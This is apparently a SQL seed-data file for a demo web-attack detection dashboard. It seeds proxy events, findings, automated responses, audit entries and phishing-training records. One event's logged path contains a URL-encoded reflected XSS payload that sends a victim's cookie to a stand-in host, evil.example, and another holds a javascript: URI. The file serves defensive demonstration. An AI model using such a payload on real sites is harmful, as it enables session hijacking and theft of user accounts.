-- ===========================================================================
-- ShieldForge — demo seed data (Module 3)
--
-- Run after schema.sql. Everything is relative to now(), so re-running this
-- on a fresh database always produces a "live" last-6-hours incident window
-- and a populated detection-time chart. Safe to re-run: inserts are keyed by
-- stable UUIDs and use ON CONFLICT DO NOTHING.
-- ===========================================================================

-- ---------------------------------------------------------------------------
-- Tenant + origins
-- ---------------------------------------------------------------------------
insert into tenants (id, name, created_at) values
  ('11111111-1111-4111-8111-111111111111', 'ShieldForge Demo', now() - interval '30 days')
on conflict (id) do nothing;

insert into origins (id, tenant_id, origin_url, proxy_path, status, created_at) values
  ('55555555-5555-4555-8555-555555555555',
   '11111111-1111-4111-8111-111111111111',
   'https://aisummit.ieeebangalore.org', '/t/aisummit', 'active', now() - interval '1 days'),
  ('22222222-2222-4222-8222-222222222201',
   '11111111-1111-4111-8111-111111111111',
   'https://victim-shop.vercel.app', '/t/victim-shop', 'active', now() - interval '6 days'),
  ('22222222-2222-4222-8222-222222222202',
   '11111111-1111-4111-8111-111111111111',
   'https://checkout-lab.vercel.app', '/t/checkout-lab', 'active', now() - interval '2 days')
on conflict (id) do nothing;

insert into policies (id, origin_id, auto_block_threshold, alert_threshold, mode) values
  ('33333333-3333-4333-8333-333333333300',
   '55555555-5555-4555-8555-555555555555', 0.90, 0.60, 'shadow'),
  ('33333333-3333-4333-8333-333333333301',
   '22222222-2222-4222-8222-222222222201', 0.90, 0.60, 'shadow'),
  ('33333333-3333-4333-8333-333333333302',
   '22222222-2222-4222-8222-222222222202', 0.85, 0.55, 'enforce')
on conflict (id) do nothing;

-- ---------------------------------------------------------------------------
-- Proxy events (redacted — no raw cookie/token values)
-- ---------------------------------------------------------------------------
insert into events
  (id, origin_id, ts, method, path, ip, user_agent, status_code, rule_hit, features, ml_attack_class, ml_confidence, ml_risk_score)
values
  ('44444444-4444-4444-8444-444444444401',
   '22222222-2222-4222-8222-222222222201', now() - interval '12 minutes',
   'GET', '/search?q=%3Cscript%3Edocument.location%3D%22https%3A%2F%2Fevil.example%2Fc%3F%22%2Bdocument.cookie%3C%2Fscript%3E',
   '203.0.113.42', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/125.0 Safari/537.36', 200,
   'xss.reflected', '{"payload_length": 91, "encoded_ratio": 0.28, "has_script_tag": true, "entropy": 4.7}'::jsonb,
   'xss', 0.972, 97),

  ('44444444-4444-4444-8444-444444444402',
   '22222222-2222-4222-8222-222222222201', now() - interval '28 minutes',
   'POST', '/api/login', '198.51.100.17', 'sqlmap/1.8.4#stable (https://sqlmap.org)', 500,
   'sqli.login_bypass', '{"quote_count": 7, "sql_keywords": 5, "payload_length": 64}'::jsonb,
   'sqli', 0.884, 88),

  ('44444444-4444-4444-8444-444444444403',
   '22222222-2222-4222-8222-222222222201', now() - interval '47 minutes',
   'GET', '/', '192.0.2.88', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15', 200,
   'response.weak_cookie', '{"cookie_count": 1, "has_httponly": false, "has_secure": false, "has_samesite": false}'::jsonb,
   'weak_cookie', 0.781, 62),

  ('44444444-4444-4444-8444-444444444404',
   '22222222-2222-4222-8222-222222222201', now() - interval '130 minutes',
   'GET', '/account', '203.0.113.91', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0 Safari/537.36', 200,
   'session.replay', '{"ip_changes": 4, "ua_changes": 3, "requests_per_minute": 31, "cookie_reuse": true}'::jsonb,
   'session_replay', 0.926, 92),

  ('44444444-4444-4444-8444-444444444405',
   '22222222-2222-4222-8222-222222222202', now() - interval '200 minutes',
   'POST', '/uploads/avatar.php', '198.51.100.203', 'python-requests/2.32.0', 200,
   'rce.php_upload', '{"extension": "php", "content_type": "image/gif", "magic_bytes_mismatch": true, "payload_length": 512}'::jsonb,
   'php2shell', 0.991, 99),

  ('44444444-4444-4444-8444-444444444406',
   '22222222-2222-4222-8222-222222222202', now() - interval '340 minutes',
   'POST', '/api/checkout', '198.51.100.76', 'curl/8.7.1', 401,
   'auth.credential_stuffing', '{"attempts_60s": 42, "distinct_accounts": 39, "failure_ratio": 0.95}'::jsonb,
   'credential_stuffing', 0.664, 66),

  ('44444444-4444-4444-8444-444444444407',
   '22222222-2222-4222-8222-222222222201', now() - interval '480 minutes',
   'GET', '/reviews?next=javascript%3Aalert(1)', '203.0.113.5', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0', 200,
   'xss.javascript_uri', '{"has_javascript_uri": true, "payload_length": 33}'::jsonb,
   'xss', 0.412, 41),

  ('44444444-4444-4444-8444-444444444408',
   '22222222-2222-4222-8222-222222222202', now() - interval '25 minutes',
   'GET', '/api/users/me', '192.0.2.144', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148', 200,
   'response.weak_cookie', '{"cookie_count": 2, "has_httponly": false, "has_secure": true, "has_samesite": false}'::jsonb,
   'weak_cookie', 0.842, 74)
on conflict (id) do nothing;

-- ---------------------------------------------------------------------------
-- Findings
-- created_at = corresponding event.ts + simulated detection latency
-- ---------------------------------------------------------------------------
insert into findings
  (id, origin_id, event_id, severity, category, title, evidence, ai_summary, status, created_at)
values
  ('55555555-5555-4555-8555-555555555501',
   '22222222-2222-4222-8222-222222222201', '44444444-4444-4444-8444-444444444401',
   'critical', 'xss', 'Reflected XSS attempting to exfiltrate session cookie',
   '{"path": "/search?q=...", "payload_type": "script_tag", "target": "document.cookie", "attacker_ip": "203.0.113.42"}'::jsonb,
   null, 'open',
   (select ts + interval '1.2 seconds' from events where id = '44444444-4444-4444-8444-444444444401')),

  ('55555555-5555-4555-8555-555555555502',
   '22222222-2222-4222-8222-222222222201', '44444444-4444-4444-8444-444444444402',
   'high', 'sqli', 'SQL injection attempt on login endpoint',
   '{"path": "/api/login", "strategy": "union_based", "mysql_error_leaked": true, "attacker_ip": "198.51.100.17"}'::jsonb,
   'An automated SQL injection tool sent a crafted login request designed to bypass authentication. The database returned an error, but no data was read. The source IP was temporarily blocked for 30 minutes and the login endpoint was rate-limited.',
   'actioned',
   (select ts + interval '0.8 seconds' from events where id = '44444444-4444-4444-8444-444444444402')),

  ('55555555-5555-4555-8555-555555555503',
   '22222222-2222-4222-8222-222222222201', '44444444-4444-4444-8444-444444444403',
   'medium', 'weak_cookie', 'Session cookie is missing HttpOnly and SameSite',
   '{"cookie": "session_id", "httponly": false, "secure": false, "samesite": null}'::jsonb,
   null, 'open',
   (select ts + interval '2.4 seconds' from events where id = '44444444-4444-4444-8444-444444444403')),

  ('55555555-5555-4555-8555-555555555504',
   '22222222-2222-4222-8222-222222222201', '44444444-4444-4444-8444-444444444404',
   'high', 'session_replay', 'Session token replayed from a new device and network',
   '{"ip_changes": 4, "ua_changes": 3, "window_minutes": 22, "account": "demo-buyer@example.test"}'::jsonb,
   'The same authenticated session was used from four different networks and three browsers within 22 minutes. This pattern is consistent with a stolen session cookie. The session was invalidated and the customer was asked to sign in again.',
   'fixed_verified',
   (select ts + interval '1.6 seconds' from events where id = '44444444-4444-4444-8444-444444444404')),

  ('55555555-5555-4555-8555-555555555505',
   '22222222-2222-4222-8222-222222222202', '44444444-4444-4444-8444-444444444405',
   'critical', 'php2shell', 'PHP webshell upload disguised as an image',
   '{"path": "/uploads/avatar.php", "declared_type": "image/gif", "detected_type": "php", "attacker_ip": "198.51.100.203"}'::jsonb,
   'An attacker uploaded a PHP script disguised as a GIF image, a common route to remote code execution. The upload was blocked before it reached the origin and the source IP was temporarily blocked. No file was written to disk.',
   'actioned',
   (select ts + interval '0.5 seconds' from events where id = '44444444-4444-4444-8444-444444444405')),

  ('55555555-5555-4555-8555-555555555506',
   '22222222-2222-4222-8222-222222222202', '44444444-4444-4444-8444-444444444406',
   'medium', 'credential_stuffing', 'Credential stuffing burst against checkout API',
   '{"attempts_60s": 42, "distinct_accounts": 39, "failure_ratio": 0.95, "attacker_ip": "198.51.100.76"}'::jsonb,
   null, 'open',
   (select ts + interval '3.1 seconds' from events where id = '44444444-4444-4444-8444-444444444406')),

  ('55555555-5555-4555-8555-555555555507',
   '22222222-2222-4222-8222-222222222201', '44444444-4444-4444-8444-444444444407',
   'low', 'xss', 'javascript: URI offered in a product review',
   '{"path": "/reviews", "field": "next", "payload": "javascript:alert(1)"}'::jsonb,
   'A product review contained a javascript: link, a low-risk reflected XSS attempt. The proxy stripped the URI and the review was not rendered. This was likely a scanner rather than a targeted attack.',
   'fixed_verified',
   (select ts + interval '1.9 seconds' from events where id = '44444444-4444-4444-8444-444444444407')),

  ('55555555-5555-4555-8555-555555555508',
   '22222222-2222-4222-8222-222222222202', '44444444-4444-4444-8444-444444444408',
   'high', 'weak_cookie', 'Authentication cookie exposed to JavaScript on profile API',
   '{"cookie": "auth_token", "httponly": false, "secure": true, "samesite": null}'::jsonb,
   null, 'open',
   (select ts + interval '1.1 seconds' from events where id = '44444444-4444-4444-8444-444444444408'))
on conflict (id) do nothing;

-- ---------------------------------------------------------------------------
-- Incidents (automated / human responses)
-- ---------------------------------------------------------------------------
insert into incidents (id, finding_id, action_taken, confidence, resolved, created_at)
values
  ('66666666-6666-4666-8666-666666666601', '55555555-5555-4555-8555-555555555501',
   'temp_block', 0.972, false,
   (select created_at + interval '0.3 seconds' from findings where id = '55555555-5555-4555-8555-555555555501')),
  ('66666666-6666-4666-8666-666666666602', '55555555-5555-4555-8555-555555555502',
   'rate_limit', 0.884, false,
   (select created_at + interval '0.4 seconds' from findings where id = '55555555-5555-4555-8555-555555555502')),
  ('66666666-6666-4666-8666-666666666603', '55555555-5555-4555-8555-555555555503',
   'alert', 0.781, false,
   (select created_at + interval '0.6 seconds' from findings where id = '55555555-5555-4555-8555-555555555503')),
  ('66666666-6666-4666-8666-666666666604', '55555555-5555-4555-8555-555555555504',
   'session_invalidate', 0.926, true,
   (select created_at + interval '0.3 seconds' from findings where id = '55555555-5555-4555-8555-555555555504')),
  ('66666666-6666-4666-8666-666666666605', '55555555-5555-4555-8555-555555555505',
   'temp_block', 0.991, false,
   (select created_at + interval '0.2 seconds' from findings where id = '55555555-5555-4555-8555-555555555505')),
  ('66666666-6666-4666-8666-666666666606', '55555555-5555-4555-8555-555555555506',
   'rate_limit', 0.664, false,
   (select created_at + interval '0.5 seconds' from findings where id = '55555555-5555-4555-8555-555555555506')),
  ('66666666-6666-4666-8666-666666666607', '55555555-5555-4555-8555-555555555507',
   'alert', 0.412, true,
   (select created_at + interval '0.4 seconds' from findings where id = '55555555-5555-4555-8555-555555555507')),
  ('66666666-6666-4666-8666-666666666608', '55555555-5555-4555-8555-555555555508',
   'challenge', 0.842, false,
   (select created_at + interval '0.3 seconds' from findings where id = '55555555-5555-4555-8555-555555555508'))
on conflict (id) do nothing;

-- ---------------------------------------------------------------------------
-- Audit log
-- ---------------------------------------------------------------------------
insert into audit_log (id, actor, action, target, ts)
values
  ('77777777-7777-4777-8777-777777777701', 'system', 'origin.auto_block',
   '{"origin": "https://victim-shop.vercel.app", "ip": "203.0.113.42", "finding_id": "55555555-5555-4555-8555-555555555501"}'::jsonb,
   now() - interval '12 minutes'),
  ('77777777-7777-4777-8777-777777777702', 'system', 'origin.rate_limit',
   '{"origin": "https://victim-shop.vercel.app", "ip": "198.51.100.17", "finding_id": "55555555-5555-4555-8555-555555555502"}'::jsonb,
   now() - interval '28 minutes'),
  ('77777777-7777-4777-8777-777777777703', 'system', 'finding.alert',
   '{"severity": "medium", "finding_id": "55555555-5555-4555-8555-555555555503"}'::jsonb,
   now() - interval '47 minutes'),
  ('77777777-7777-4777-8777-777777777704', 'system', 'session.invalidate',
   '{"finding_id": "55555555-5555-4555-8555-555555555504", "account": "demo-buyer@example.test"}'::jsonb,
   now() - interval '130 minutes'),
  ('77777777-7777-4777-8777-777777777705', 'system', 'origin.auto_block',
   '{"origin": "https://checkout-lab.vercel.app", "ip": "198.51.100.203", "finding_id": "55555555-5555-4555-8555-555555555505"}'::jsonb,
   now() - interval '200 minutes'),
  ('77777777-7777-4777-8777-777777777706', 'system', 'origin.rate_limit',
   '{"origin": "https://checkout-lab.vercel.app", "ip": "198.51.100.76", "finding_id": "55555555-5555-4555-8555-555555555506"}'::jsonb,
   now() - interval '340 minutes'),
  ('77777777-7777-4777-8777-777777777707', 'demo-analyst', 'finding.fix_verified',
   '{"finding_id": "55555555-5555-4555-8555-555555555504"}'::jsonb,
   now() - interval '95 minutes')
on conflict (id) do nothing;

-- ---------------------------------------------------------------------------
-- Behavioral training (Part 4 owns writes; seeded here so the tab works)
-- ---------------------------------------------------------------------------
insert into training_users (id, name, risk_score) values
  ('88888888-8888-4888-8888-888888888801', 'Aarav Mehta', 82),
  ('88888888-8888-4888-8888-888888888802', 'Priya Nair', 64),
  ('88888888-8888-4888-8888-888888888803', 'Rohan Das', 41),
  ('88888888-8888-4888-8888-888888888804', 'Meera Iyer', 23),
  ('88888888-8888-4888-8888-888888888805', 'Kabir Shah', 9)
on conflict (id) do nothing;

insert into training_events (id, user_id, event_type, ts)
values
  ('99999999-9999-4999-8999-999999999901', '88888888-8888-4888-8888-888888888801', 'phishing_sent', now() - interval '14 days'),
  ('99999999-9999-4999-8999-999999999902', '88888888-8888-4888-8888-888888888801', 'phishing_clicked', now() - interval '13 days 22 hours'),
  ('99999999-9999-4999-8999-999999999903', '88888888-8888-4888-8888-888888888801', 'lesson_assigned', now() - interval '12 days'),
  ('99999999-9999-4999-8999-999999999904', '88888888-8888-4888-8888-888888888801', 'lesson_completed', now() - interval '11 days'),
  ('99999999-9999-4999-8999-999999999905', '88888888-8888-4888-8888-888888888801', 'phishing_sent', now() - interval '5 days'),
  ('99999999-9999-4999-8999-999999999906', '88888888-8888-4888-8888-888888888801', 'phishing_clicked', now() - interval '4 days 20 hours'),
  ('99999999-9999-4999-8999-999999999907', '88888888-8888-4888-8888-888888888801', 'lesson_assigned', now() - interval '4 days'),

  ('99999999-9999-4999-8999-999999999908', '88888888-8888-4888-8888-888888888802', 'phishing_sent', now() - interval '12 days'),
  ('99999999-9999-4999-8999-999999999909', '88888888-8888-4888-8888-888888888802', 'phishing_clicked', now() - interval '11 days'),
  ('99999999-9999-4999-8999-999999999910', '88888888-8888-4888-8888-888888888802', 'lesson_completed', now() - interval '9 days'),
  ('99999999-9999-4999-8999-999999999911', '88888888-8888-4888-8888-888888888802', 'phishing_sent', now() - interval '3 days'),
  ('99999999-9999-4999-8999-999999999912', '88888888-8888-4888-8888-888888888802', 'lesson_completed', now() - interval '2 days'),

  ('99999999-9999-4999-8999-999999999913', '88888888-8888-4888-8888-888888888803', 'phishing_sent', now() - interval '10 days'),
  ('99999999-9999-4999-8999-999999999914', '88888888-8888-4888-8888-888888888803', 'phishing_clicked', now() - interval '9 days 21 hours'),
  ('99999999-9999-4999-8999-999999999915', '88888888-8888-4888-8888-888888888803', 'lesson_completed', now() - interval '7 days'),

  ('99999999-9999-4999-8999-999999999916', '88888888-8888-4888-8888-888888888804', 'phishing_sent', now() - interval '8 days'),
  ('99999999-9999-4999-8999-999999999917', '88888888-8888-4888-8888-888888888804', 'lesson_completed', now() - interval '7 days'),

  ('99999999-9999-4999-8999-999999999918', '88888888-8888-4888-8888-888888888805', 'phishing_sent', now() - interval '6 days'),
  ('99999999-9999-4999-8999-999999999919', '88888888-8888-4888-8888-888888888805', 'lesson_completed', now() - interval '5 days'),
  ('99999999-9999-4999-8999-999999999920', '88888888-8888-4888-8888-888888888805', 'phishing_sent', now() - interval '1 day')
on conflict (id) do nothing;
